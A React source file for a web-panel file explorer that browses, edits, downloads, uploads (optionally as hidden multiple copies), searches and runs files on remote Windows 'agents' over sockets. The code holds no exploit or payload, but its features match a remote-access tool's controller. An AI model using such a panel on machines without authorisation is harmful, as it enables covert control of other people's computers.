import { useState, useEffect, useRef, useCallback } from "react";
import { on } from "../../socket/events";
import { send } from "../../socket";
import { useContextMenu } from "../contextmenu/ContextMenu";
import { CatIcon, CodeLines } from "../messages/FilePreview";
import { formatSize, category, isText } from "../../utils/attachments";
import { getAppState, setAppState } from "../../appstate";
import useRubberBand from "../../hooks/useRubberBand";
import { CopyIcon, CheckIcon } from "../icons";
import Window from "../ui/Window";
import Button from "../ui/Button";
import ProgressBar from "../ui/ProgressBar";
import { uploadFile as uploadToServer } from "../../api/upload";

function FolderGlyph({ className = "w-4 h-4" }) {
  return (
    <svg className={className} viewBox="0 0 24 24">
      <path d="M2 6a2 2 0 012-2h5l2 2h9a2 2 0 012 2v10a2 2 0 01-2 2H4a2 2 0 01-2-2V6z" fill="#e8c25a" stroke="#9a7b2d" strokeWidth="1" />
      <path d="M2 9h20" stroke="#9a7b2d" strokeWidth="0.75" />
    </svg>
  );
}

function FileViewer({ path, agentId, data, onClose }) {
  const [text, setText] = useState(data);
  const [dirty, setDirty] = useState(false);
  const [copied, setCopied] = useState(false);
  const [saving, setSaving] = useState(false);
  const [saveErr, setSaveErr] = useState("");
  const name = path.split("\\").pop();

  const copy = () => {
    navigator.clipboard?.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }).catch(() => {});
  };

  const save = () => {
    setSaving(true);
    setSaveErr("");
    send("fs_op", { agent_id: agentId, op: "write", data: { path, content: text } });
    setTimeout(() => { setSaving(false); setDirty(false); }, 800);
  };

  return (
    <Window
      title={`${name}${dirty ? " •" : ""} — Editor`}
      draggable
      resizable
      size={{ w: 860, h: 600 }}
      onClose={onClose}
      bodyClassName=""
      className="win-swish"
    >
      <div className="h-full flex flex-col">
        <div className="flex items-center gap-2 px-2 py-1 flex-shrink-0" style={{ background: "var(--window-face)", borderBottom: "1px solid var(--edge-dark)" }}>
          <span className="flex-1 truncate text-[11px] font-mono" style={{ color: "var(--muted)" }}>{path}</span>
          {saveErr && <span className="text-[11px]" style={{ color: "#a02d1a" }}>{saveErr}</span>}
          <Button onClick={copy} className="flex items-center gap-1 text-xs px-2 py-0.5">
            {copied ? <CheckIcon className="w-3.5 h-3.5" /> : <CopyIcon className="w-3.5 h-3.5" />}
            {copied ? "Copied" : "Copy"}
          </Button>
          <Button onClick={save} disabled={!dirty || saving} className="text-xs px-3 py-0.5">
            {saving ? "Saving…" : "Save"}
          </Button>
        </div>
        <textarea
          className="flex-1 min-h-0 font-mono text-xs outline-none resize-none p-2 vista-scroll"
          style={{ background: "var(--input-bg)", color: "var(--text)", border: "none", lineHeight: 1.5 }}
          value={text}
          onChange={e => { setText(e.target.value); setDirty(true); }}
          spellCheck={false}
        />
        <div className="px-2 py-0.5 text-[11px] flex-shrink-0" style={{ background: "var(--window-face)", color: "var(--muted)", borderTop: "1px solid var(--edge-dark)" }}>
          {text.split("\n").length} lines · {formatSize(text.length)}{dirty ? " · unsaved changes" : ""}
        </div>
      </div>
    </Window>
  );
}

function Modal({ title, children, onClose }) {
  return (
    <div className="fixed inset-0 z-[9000] flex items-center justify-center" style={{ background: "rgba(0,0,0,0.4)" }} onClick={onClose}>
      <div className="y2k-window min-w-[320px]" onClick={(e) => e.stopPropagation()}>
        <div className="y2k-titlebar">{title}</div>
        <div className="p-4">{children}</div>
      </div>
    </div>
  );
}

function ConfirmModal({ message, onConfirm, onCancel }) {
  return (
    <Modal title="Confirm Delete" onClose={onCancel}>
      <p className="text-sm mb-4">{message}</p>
      <div className="flex justify-end gap-2">
        <Button onClick={onCancel} className="px-4 py-1 text-sm">Cancel</Button>
        <Button onClick={onConfirm} color="red" className="px-4 py-1 text-sm">Delete</Button>
      </div>
    </Modal>
  );
}

function UploadProgress({ file, destPaths, overwrite, hidden, agentId, onDone, onError }) {
  const [progress, setProgress] = useState(0);
  const [stage, setStage] = useState("uploading");
  const [err, setErr] = useState("");

  useEffect(() => {
    let cancelled = false;
    uploadToServer(file, (p) => { if (!cancelled) setProgress(p * 100); })
      .then(({ id }) => {
        if (cancelled) return;
        setProgress(100);
        setStage("sending");
        send("fs_upload", { agent_id: agentId, attachment_id: id, dest_paths: destPaths, overwrite, hidden });
        setTimeout(onDone, 600);
      })
      .catch((e) => {
        if (cancelled) return;
        setErr(e.message);
        setStage("error");
        onError(e.message);
      });
    return () => { cancelled = true; };
  }, []);

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 8, padding: "8px 0", minWidth: 320 }}>
      <ProgressBar
        progress={progress}
        label={stage === "sending" ? "Sending to agent…" : file.name}
        error={err}
      />
      <div style={{ fontSize: 11, color: "var(--muted)" }}>
        {stage === "uploading" && `${(file.size / 1024 / 1024).toFixed(1)} MB`}
        {stage === "sending" && `${destPaths.length} destination${destPaths.length !== 1 ? "s" : ""}`}
        {stage === "error" && "Failed"}
      </div>
    </div>
  );
}

function CustomModal({ cfg, onCancel }) {
  return (
    <Modal title={cfg.title} onClose={onCancel}>
      {cfg.render()}
    </Modal>
  );
}

function OptionsModal({ cfg, onCancel }) {
  const init = {};
  cfg.fields.forEach(f => { init[f.key] = f.default ?? (f.type === "checkbox" ? false : f.type === "number" ? 1 : ""); });
  const [vals, setVals] = useState(init);
  const set = (k, v) => setVals(prev => ({ ...prev, [k]: v }));

  const submit = () => {
    const name = (vals.name || "").trim();
    if (!name) return;
    cfg.onConfirm(vals);
  };

  return (
    <Modal title={cfg.title} onClose={onCancel}>
      <div className="flex flex-col gap-2 mb-4">
        {cfg.fields.map(f => (
          <label key={f.key} className="flex flex-col gap-0.5">
            <span className="text-xs font-semibold" style={{ color: "var(--muted)" }}>{f.label}</span>
            {f.type === "checkbox" ? (
              <label className="flex items-center gap-2 text-sm cursor-pointer" style={{ color: "var(--text)" }}>
                <input type="checkbox" checked={vals[f.key]} onChange={e => set(f.key, e.target.checked)} />
                {f.checkLabel || f.label}
              </label>
            ) : f.type === "number" ? (
              <input
                type="number"
                min={1} max={99}
                className="w-24 px-2 py-1 text-sm bevel-in outline-none"
                style={{ background: "var(--input-bg)", color: "var(--text)" }}
                value={vals[f.key]}
                onChange={e => set(f.key, Math.max(1, parseInt(e.target.value) || 1))}
              />
            ) : (
              <input
                autoFocus={f.key === "name"}
                className="w-full px-2 py-1 text-sm bevel-in outline-none"
                style={{ background: "var(--input-bg)", color: "var(--text)" }}
                value={vals[f.key]}
                onChange={e => set(f.key, e.target.value)}
                onKeyDown={e => { if (e.key === "Enter") submit(); if (e.key === "Escape") onCancel(); }}
              />
            )}
          </label>
        ))}
      </div>
      <div className="flex justify-end gap-2">
        <Button onClick={onCancel} className="px-4 py-1 text-sm">Cancel</Button>
        <Button onClick={submit} className="px-4 py-1 text-sm">{cfg.ok || "OK"}</Button>
      </div>
    </Modal>
  );
}

export default function FileExplorer({ agent }) {
  const initialPath = getAppState(String(agent.id), "fileexplorer").path || "C:\\";
  const [path, setPath] = useState(initialPath);
  const [inputPath, setInputPath] = useState(initialPath);
  const [entries, setEntries] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [selected, setSelected] = useState(() => new Set());
  const { band, ref: wrapRef, onPointerDown: onBandDown } = useRubberBand({
    onSelect: setSelected,
    onClear: () => setSelected(new Set()),
  });
  const [viewer, setViewer] = useState(null);
  const [confirm, setConfirm] = useState(null);
  const [inputDlg, setInputDlg] = useState(null);
  const pathRef = useRef(initialPath);
  const agentId = String(agent.id);
  const openMenu = useContextMenu();
  const [searchOpen, setSearchOpen] = useState(false);
  const [searchPattern, setSearchPattern] = useState("");
  const [searchDepth, setSearchDepth] = useState(5);
  const [searchHidden, setSearchHidden] = useState(false);
  const [searchContent, setSearchContent] = useState(false);
  const [searchMaxKB, setSearchMaxKB] = useState(512);
  const [searchResults, setSearchResults] = useState(null);
  const [searching, setSearching] = useState(false);

  const navigate = useCallback((p) => {
    pathRef.current = p;
    setPath(p); setInputPath(p); setLoading(true); setError(""); setSelected(new Set());
    setAppState(agentId, "fileexplorer", { path: p });
    send("fs_op", { agent_id: agentId, op: "list", data: { path: p } });
  }, [agentId]);

  useEffect(() => {
    send("fs_open", { agent_id: agentId });
    const t = setTimeout(() => navigate(pathRef.current), 50);
    return () => {
      clearTimeout(t);
      send("fs_close", { agent_id: agentId });
    };
  }, [agentId, navigate]);

  useEffect(() => on("fs_list_result", (p) => {
    if (!p || String(p.agent_id) !== agentId) return;
    const lines = (p.entries || "").trim().split("\n").filter(Boolean);
    const parsed = lines.map(l => {
      const [name, isDir, size, hidden] = l.split("|");
      const path = (p.path.replace(/\\$/, "") + "\\" + name);
      return { name, path, isDir: isDir === "1", size: parseInt(size) || 0, hidden: hidden === "1" };
    }).sort((a, b) => a.isDir !== b.isDir ? (a.isDir ? -1 : 1) : a.name.localeCompare(b.name));
    setEntries(parsed); setLoading(false);
  }), [agentId]);

  useEffect(() => on("fs_read_result", (p) => {
    if (!p || String(p.agent_id) !== agentId) return;
    if (p.error) { setError(`Read failed: ${p.error}`); return; }
    if (!p.attachment) {
      setViewer({ path: p.path, data: "" });
      return;
    }
    {
      fetch(`/api/v1/attachments/${p.attachment}`, { headers: { Authorization: `Bearer ${window.__token || ""}` } })
        .then(r => r.arrayBuffer())
        .then(buf => {
          if (buf.byteLength > 2 * 1024 * 1024) {
            setError("File too large to preview — use Download instead.");
            return;
          }
          const bytes = new Uint8Array(buf);
          let encoding = "utf-8";
          if (bytes[0] === 0xFF && bytes[1] === 0xFE) encoding = "utf-16le";
          else if (bytes[0] === 0xFE && bytes[1] === 0xFF) encoding = "utf-16be";
          else if (bytes[0] === 0xEF && bytes[1] === 0xBB && bytes[2] === 0xBF) encoding = "utf-8";
          const text = new TextDecoder(encoding).decode(buf);
          setViewer({ path: p.path, data: text });
        })
        .catch(() => setError("Failed to fetch file contents"));
    }
  }), [agentId]);

  const navigateRef = useRef(navigate);
  useEffect(() => { navigateRef.current = navigate; }, [navigate]);

  useEffect(() => on("fs_op_result", (p) => {
    if (!p || String(p.agent_id) !== agentId) return;
    if (!p.ok) { setError(`Operation failed: ${p.op} on ${p.path || p.src || ""}`); return; }
    setError("");
    if (p.op === "write") return;
    navigateRef.current(pathRef.current);
  }), [agentId]);

  useEffect(() => on("fs_download_result", (p) => {
    if (!p || String(p.agent_id) !== agentId) return;
    if (!p.ok) { setError(`Download failed: ${p.error || ""}`); return; }
    const a = document.createElement("a");
    a.href = `/api/v1/attachments/${p.id}`;
    a.download = p.path.split("\\").pop();
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }), [agentId]);

  useEffect(() => on("fs_search_result", (p) => {
    if (!p || String(p.agent_id) !== agentId) return;
    const lines = (p.results || "").trim().split("\n").filter(Boolean);
    const parsed = lines.map(l => {
      const parts = l.split("\t");
      return {
        path:    parts[0] || l,
        type:    parts[1] || "name",
        snippet: (parts[2] || "").trim(),
      };
    });
    setSearchResults(parsed);
    setSearching(false);
  }), [agentId]);

  const fsChangedTimer = useRef(null);
  useEffect(() => on("fs_changed", (p) => {
    if (!p || String(p.agent_id) !== agentId) return;
    if (p.path !== pathRef.current) return;
    if (fsChangedTimer.current) clearTimeout(fsChangedTimer.current);
    fsChangedTimer.current = setTimeout(() => navigateRef.current(pathRef.current), 400);
  }), [agentId]);

  const join = (base, name) => base.replace(/\\$/, "") + "\\" + name;

  const MAX_PREVIEW = 2 * 1024 * 1024;

  const PREVIEW_EXT = new Set(["txt","log","json","xml","htm","html","csv","md","yaml","yml",
    "ini","cfg","config","toml","go","js","ts","jsx","tsx","c","h","cpp","cs","py","sh",
    "bat","ps1","cmd","reg","env","gitignore","sql"]);
  const extOf = (name) => (name.includes(".") ? name.slice(name.lastIndexOf(".") + 1).toLowerCase() : "");
  const canPreview = (it) => !it.isDir && PREVIEW_EXT.has(extOf(it.name)) && it.size <= MAX_PREVIEW;

  const requestRead = (it, p) => {
    if (!canPreview(it)) return;
    send("fs_op", { agent_id: agentId, op: "read", data: { path: p } });
  };

  const act = (action, item) => {
    const ip = item ? join(path, item.name) : null;
    switch (action) {
      case "open":
        if (item.isDir) navigate(ip);
        else requestRead(item, ip);
        break;
      case "read":
        requestRead(item, ip);
        break;
      case "download":
        send("fs_download", { agent_id: agentId, data: { path: ip } });
        break;
      case "delete":
        setConfirm({ msg: `Delete "${item.name}"?`, cb: () => {
          send("fs_op", { agent_id: agentId, op: "delete", data: { paths: [ip] } });
          setConfirm(null);
        }});
        break;
      case "rename":
        setInputDlg({
          title: `Rename "${item.name}"`,
          ok: "Rename",
          fields: [
            { key: "name", label: "New name", type: "text", default: item.name },
          ],
          onConfirm: (v) => {
            send("fs_op", { agent_id: agentId, op: "rename", data: { old: ip, new: join(path, v.name.trim()) } });
            setInputDlg(null);
          },
        });
        break;
      case "copy": {
        const ext = item.name.includes(".") ? item.name.slice(item.name.lastIndexOf(".")) : "";
        const base = item.name.slice(0, item.name.length - ext.length);
        send("fs_op", { agent_id: agentId, op: "copy", data: { src: ip, dst: join(path, base + "_copy" + ext) } });
        break;
      }
      case "create":
        setInputDlg({
          title: "New File",
          ok: "Create",
          fields: [
            { key: "name", label: "Name", type: "text", default: "newfile.txt" },
            { key: "hidden", label: "Hidden", type: "checkbox", checkLabel: "Mark as hidden" },
          ],
          onConfirm: (v) => {
            send("fs_op", { agent_id: agentId, op: "create", data: { path: join(path, v.name.trim()), hidden: v.hidden } });
            setInputDlg(null);
          },
        });
        break;
      case "mkdir":
        setInputDlg({
          title: "New Folder",
          ok: "Create",
          fields: [
            { key: "name", label: "Name", type: "text", default: "New Folder" },
            { key: "hidden", label: "Hidden", type: "checkbox", checkLabel: "Mark as hidden" },
          ],
          onConfirm: (v) => {
            send("fs_op", { agent_id: agentId, op: "mkdir", data: { path: join(path, v.name.trim()), hidden: v.hidden } });
            setInputDlg(null);
          },
        });
        break;
      case "toggle_hidden":
        send("fs_op", { agent_id: agentId, op: "toggle_hidden", data: { path: ip } });
        break;
      case "refresh": navigate(pathRef.current); break;
    }
  };

  const itemMenu = (item, sel = selected) =>
    sel.size > 1 && sel.has(item.name)
      ? [
          { label: `Download (${[...sel].filter((n) => entries.find((e) => e.name === n && !e.isDir)).length})`, action: bulkDownload },
          "—",
          { label: `Delete (${sel.size})`, action: bulkDelete, danger: true },
        ]
      : item.isDir
      ? [
          { label: "Open", action: () => act("open", item) },
          "—",
          { label: "Rename", action: () => act("rename", item) },
          { label: item.hidden ? "Unhide" : "Hide", action: () => act("toggle_hidden", item) },
          { label: "Delete", action: () => act("delete", item), danger: true },
        ]
      : [
          ...(canPreview(item)
            ? [
                { label: "Open", action: () => act("open", item) },
                { label: "View Contents", action: () => act("read", item) },
              ]
            : []),
          { label: "Run", action: () => send("fs_run", { agent_id: agentId, path: item.path }) },
          { label: "Download", action: () => act("download", item) },
          "—",
          { label: "Duplicate", action: () => act("copy", item) },
          { label: "Rename", action: () => act("rename", item) },
          { label: item.hidden ? "Unhide" : "Hide", action: () => act("toggle_hidden", item) },
          { label: "Delete", action: () => act("delete", item), danger: true },
        ];

  const bgMenu = () => [
    { label: "Upload File", action: uploadFile },
    "—",
    { label: "New File", action: () => act("create", null) },
    { label: "New Folder", action: () => act("mkdir", null) },
    "—",
    { label: "Refresh", action: () => act("refresh", null) },
  ];

  const selectRow = (e, item) => {
    e.stopPropagation();
    if (e.ctrlKey || e.metaKey) {
      setSelected((s) => {
        const n = new Set(s);
        if (n.has(item.name)) n.delete(item.name); else n.add(item.name);
        return n;
      });
    } else {
      setSelected(new Set([item.name]));
    }
  };

  const bulkDownload = () => {
    const paths = entries
      .filter((e) => selected.has(e.name) && !e.isDir)
      .map((e) => join(path, e.name));
    if (paths.length === 0) return;
    if (paths.length === 1) {
      send("fs_download", { agent_id: agentId, data: { path: paths[0] } });
    } else {
      send("fs_download_multi", { agent_id: agentId, data: { paths } });
    }
  };

  const bulkDelete = () => {
    const names = [...selected];
    setConfirm({ msg: `Delete ${names.length} item${names.length !== 1 ? "s" : ""}?`, cb: () => {
      send("fs_op", { agent_id: agentId, op: "delete", data: { paths: names.map(n => join(path, n)) } });
      setConfirm(null);
    }});
  };

  const uploadFile = () => {
    const input = document.createElement("input");
    input.type = "file";
    input.onchange = (e) => {
      const file = e.target.files[0];
      if (!file) return;
      setInputDlg({
        title: "Upload File",
        ok: "Upload",
        fields: [
          { key: "name", label: "Save as", type: "text", default: file.name },
          { key: "count", label: "Copies", type: "number", default: 1 },
          { key: "overwrite", label: "Overwrite", type: "checkbox", checkLabel: "Overwrite if exists" },
          { key: "hidden", label: "Hidden", type: "checkbox", checkLabel: "Mark as hidden" },
        ],
        onConfirm: (v) => {
          const count = Math.max(1, v.count || 1);
          const baseName = v.name.trim() || file.name;
          const ext = baseName.includes(".") ? baseName.slice(baseName.lastIndexOf(".")) : "";
          const base = baseName.slice(0, baseName.length - ext.length);
          const destPaths = Array.from({ length: count }, (_, i) =>
            join(path, i === 0 ? baseName : `${base} (${i + 1})${ext}`)
          );

          setInputDlg({
            title: "Uploading…",
            custom: true,
            render: () => (
              <UploadProgress
                file={file}
                destPaths={destPaths}
                overwrite={v.overwrite}
                hidden={v.hidden}
                agentId={agentId}
                onDone={() => setInputDlg(null)}
                onError={(msg) => { setError(msg); setInputDlg(null); }}
              />
            ),
          });
        },
      });
    };
    input.click();
  };

  const runSearch = () => {
    if (!searchPattern.trim()) return;
    setSearching(true);
    setSearchResults(null);
    send("fs_search", {
      agent_id: agentId,
      path,
      pattern: searchPattern.trim(),
      max_depth: searchDepth,
      hidden: searchHidden,
      content: searchContent,
      max_file_kb: searchMaxKB,
    });
  };

  const goUp = () => {
    const parts = path.replace(/\\$/, "").split("\\");
    if (parts.length <= 1) return;
    parts.pop(); navigate(parts.join("\\") + "\\");
  };

  const visible = entries;

  return (
    <div
      className="h-full flex flex-col text-sm"
      style={{ background: "var(--window-face)", color: "var(--text)" }}
      onContextMenu={(e) => { e.stopPropagation(); openMenu(e, bgMenu()); }}
    >
      {viewer && <FileViewer path={viewer.path} agentId={agentId} data={viewer.data} onClose={() => setViewer(null)} />}
      {confirm && <ConfirmModal message={confirm.msg} onConfirm={confirm.cb} onCancel={() => setConfirm(null)} />}
      {inputDlg && (inputDlg.custom
        ? <CustomModal cfg={inputDlg} onCancel={() => setInputDlg(null)} />
        : <OptionsModal cfg={inputDlg} onCancel={() => setInputDlg(null)} />)}

      <div className="flex items-center gap-1.5 px-1.5 py-1 flex-shrink-0" style={{ borderBottom: "1px solid var(--edge-dark)" }}>
        <Button onClick={goUp} title="Up" className="px-2.5 py-0.5">↑</Button>
        <Button onClick={() => navigate(pathRef.current)} title="Refresh" className="px-2.5 py-0.5">↺</Button>
        <input
          value={inputPath}
          onChange={(e) => setInputPath(e.target.value)}
          onKeyDown={(e) => e.key === "Enter" && navigate(inputPath)}
          className="flex-1 px-2 py-0.5 text-xs font-mono bevel-in outline-none"
          style={{ background: "var(--input-bg)", color: "var(--text)" }}
        />
      </div>

      {searchOpen && (
        <div className="flex flex-col gap-1 px-1.5 py-1 flex-shrink-0" style={{ borderBottom: "1px solid var(--edge-dark)", background: "var(--window-face)" }}>
          <div className="flex items-center gap-1.5">
            <input
              placeholder="search pattern…"
              value={searchPattern}
              onChange={e => setSearchPattern(e.target.value)}
              onKeyDown={e => e.key === "Enter" && runSearch()}
              className="flex-1 px-2 py-0.5 text-xs font-mono bevel-in outline-none"
              style={{ background: "var(--input-bg)", color: "var(--text)" }}
              autoFocus
            />
            <Button onClick={runSearch} className="px-3 py-0.5 text-xs" disabled={searching}>
              {searching ? "…" : "Search"}
            </Button>
            <Button onClick={() => { setSearchOpen(false); setSearchResults(null); }} className="px-2 py-0.5 text-xs">✕</Button>
          </div>
          <div className="flex items-center gap-3 text-xs" style={{ color: "var(--muted)" }}>
            <label className="flex items-center gap-1">
              depth
              <input
                type="number" min={0} max={99}
                value={searchDepth}
                onChange={e => setSearchDepth(Math.max(0, parseInt(e.target.value) || 0))}
                className="w-10 px-1 py-0.5 text-xs bevel-in outline-none text-center"
                style={{ background: "var(--input-bg)", color: "var(--text)" }}
              />
            </label>
            <label className="flex items-center gap-1 cursor-pointer">
              <input type="checkbox" checked={searchHidden} onChange={e => setSearchHidden(e.target.checked)} />
              hidden files
            </label>
            <label className="flex items-center gap-1 cursor-pointer">
              <input type="checkbox" checked={searchContent} onChange={e => setSearchContent(e.target.checked)} />
              inside files
            </label>
            {searchContent && (
              <label className="flex items-center gap-1">
                max
                <input
                  type="number" min={1} max={10240}
                  value={searchMaxKB}
                  onChange={e => setSearchMaxKB(Math.max(1, parseInt(e.target.value) || 512))}
                  className="w-16 px-1 py-0.5 text-xs bevel-in outline-none text-center"
                  style={{ background: "var(--input-bg)", color: "var(--text)" }}
                />
                KB
              </label>
            )}
          </div>
        </div>
      )}

      {!searchOpen && (
        <div className="flex-shrink-0 px-1.5 py-0.5" style={{ borderBottom: "1px solid var(--edge-dark)" }}>
          <Button onClick={() => setSearchOpen(true)} className="px-2.5 py-0.5 text-xs">⌕ Search</Button>
        </div>
      )}

      {searchResults !== null && searchOpen && (
        <div className="flex-shrink-0 bevel-in mx-1 mt-1 overflow-y-auto vista-scroll" style={{ maxHeight: 200, background: "var(--input-bg)" }}>
          {searchResults.length === 0
            ? <div className="p-3 text-xs text-center" style={{ color: "var(--muted)" }}>No results</div>
            : searchResults.map((r, i) => {
                const name = r.path.includes("\\") ? r.path.slice(r.path.lastIndexOf("\\") + 1) : r.path;
                const dir = r.path.includes("\\") ? r.path.slice(0, r.path.lastIndexOf("\\")) : r.path;
                const isContent = r.type === "content";
                const fakeItem = { name, isDir: false, size: 0 };
                const previewable = canPreview(fakeItem);
                return (
                  <div
                    key={i}
                    className="flex flex-col px-2 py-0.5 text-xs font-mono cursor-pointer"
                    style={{ borderBottom: "1px solid var(--edge-dark)" }}
                    title={r.path}
                    onDoubleClick={() => {
                      if (previewable) requestRead(fakeItem, r.path);
                      else navigate(dir);
                    }}
                    onMouseEnter={e => { e.currentTarget.style.background = "var(--titlebar)"; e.currentTarget.style.color = "var(--titlebar-text)"; }}
                    onMouseLeave={e => { e.currentTarget.style.background = ""; e.currentTarget.style.color = ""; }}
                  >
                    <div className="flex items-center gap-1.5">
                      <span
                        className="flex-shrink-0 text-[10px] px-1 rounded"
                        style={{
                          background: isContent ? "var(--titlebar)" : "var(--edge-dark)",
                          color: isContent ? "var(--titlebar-text)" : "var(--muted)",
                        }}
                      >
                        {isContent ? "content" : "name"}
                      </span>
                      <span className="font-semibold flex-shrink-0" style={{ color: "var(--text)" }}>{name}</span>
                      <span className="truncate" style={{ color: "var(--muted)", direction: "rtl", textAlign: "left" }}>{dir}</span>
                    </div>
                    {isContent && r.snippet && (
                      <div className="truncate text-[10px] pl-8 mt-0.5" style={{ color: "var(--muted)", fontFamily: "monospace" }}>
                        {r.snippet}
                      </div>
                    )}
                  </div>
                );
              })
          }
          <div className="px-2 py-0.5 text-[10px]" style={{ color: "var(--muted)", background: "var(--window-face)" }}>
            {searchResults.length} result{searchResults.length !== 1 ? "s" : ""} · double-click to navigate
          </div>
        </div>
      )}

      {error && (
        <div className="px-2.5 py-1 text-xs flex-shrink-0 bevel-in mx-1 mt-1" style={{ background: "#f3ded9", color: "#a02d1a" }}>
          {error}
        </div>
      )}

      <div
        ref={wrapRef}
        onPointerDown={onBandDown}
        tabIndex={0}
        onKeyDown={(e) => {
          if ((e.ctrlKey || e.metaKey) && e.key === "a") {
            e.preventDefault();
            setSelected(new Set(entries.map(it => it.name)));
          }
        }}
        className="flex-1 min-h-0 overflow-y-auto vista-scroll bevel-in m-1 relative outline-none"
        style={{ background: "var(--input-bg)", userSelect: band ? "none" : undefined, touchAction: band ? "none" : undefined }}
      >
        {band && (
          <div
            className="absolute z-[5] pointer-events-none"
            style={{
              left: band.x, top: band.y, width: band.w, height: band.h,
              border: "1px dotted var(--titlebar)",
              background: "rgba(91,110,100,0.18)",
            }}
          />
        )}
        <table className="w-full border-collapse">
          <thead className="sticky top-0 z-10">
            <tr>
              <th className="bevel-out text-left px-2 py-0.5 text-xs font-semibold w-[70%]" style={{ background: "var(--window-face)", color: "var(--text)" }}>Name</th>
              <th className="bevel-out text-right px-2 py-0.5 text-xs font-semibold" style={{ background: "var(--window-face)", color: "var(--text)" }}>Size</th>
            </tr>
          </thead>
          <tbody>
            {visible.map(item => {
              const isSel = selected.has(item.name);
              return (
                <tr
                  key={item.name}
                  data-name={item.name}
                  style={{
                    opacity: item.hidden ? 0.45 : 1,
                    background: isSel ? "var(--titlebar)" : "",
                    color: isSel ? "var(--titlebar-text)" : "var(--text)",
                    cursor: "default",
                    userSelect: "none",
                  }}
                  onClick={(e) => selectRow(e, item)}
                  onDoubleClick={() => act("open", item)}
                  onContextMenu={(e) => {
                    e.stopPropagation();
                    const sel = selected.has(item.name) ? selected : new Set([item.name]);
                    if (sel !== selected) setSelected(sel);
                    openMenu(e, itemMenu(item, sel));
                  }}
                >
                  <td className="px-2 py-0.5">
                    <span className="inline-flex items-center gap-1.5">
                      {item.isDir
                        ? <FolderGlyph className="w-4 h-4 flex-shrink-0" />
                        : <CatIcon cat={category({ filename: item.name })} className="w-4 h-4 flex-shrink-0" />}
                      {item.name}
                    </span>
                  </td>
                  <td className="px-2 py-0.5 text-right text-xs" style={{ color: isSel ? "var(--titlebar-text)" : "var(--muted)" }}>
                    {item.isDir ? "" : formatSize(item.size)}
                  </td>
                </tr>
              );
            })}
            {!loading && visible.length === 0 && (
              <tr><td colSpan={2} className="p-6 text-center" style={{ color: "var(--muted)" }}>Empty</td></tr>
            )}
          </tbody>
        </table>
        {loading && <div className="p-4 text-center" style={{ color: "var(--muted)" }}>Loading…</div>}
      </div>

      <div className="px-2 py-0.5 text-[11px] flex-shrink-0 bevel-in mx-1 mb-1" style={{ background: "var(--window-face)", color: "var(--muted)" }}>
        {loading ? "Loading…" : `${visible.length} item${visible.length !== 1 ? "s" : ""}${selected.size === 1 ? ` · ${[...selected][0]}` : selected.size > 1 ? ` · ${selected.size} selected` : ""}`}
      </div>
    </div>
  );
}